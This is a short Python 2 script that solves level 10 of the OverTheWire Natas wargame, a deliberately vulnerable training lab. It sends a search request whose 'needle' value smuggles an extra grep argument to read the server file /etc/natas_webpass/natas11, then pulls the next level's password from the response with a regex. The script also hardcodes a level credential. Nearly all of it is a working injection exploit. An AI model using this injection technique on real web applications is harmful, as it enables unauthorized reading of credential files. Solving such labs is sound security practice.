#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level10.py
  Solution for natas level10
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 10
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
referer = 'http://natas%s.natas.labs.overthewire.org/?needle=&submit=Search' % level

def get_flag():
    r = requests.get(host + '?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search', auth=(user, password), headers={'referer': referer})
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
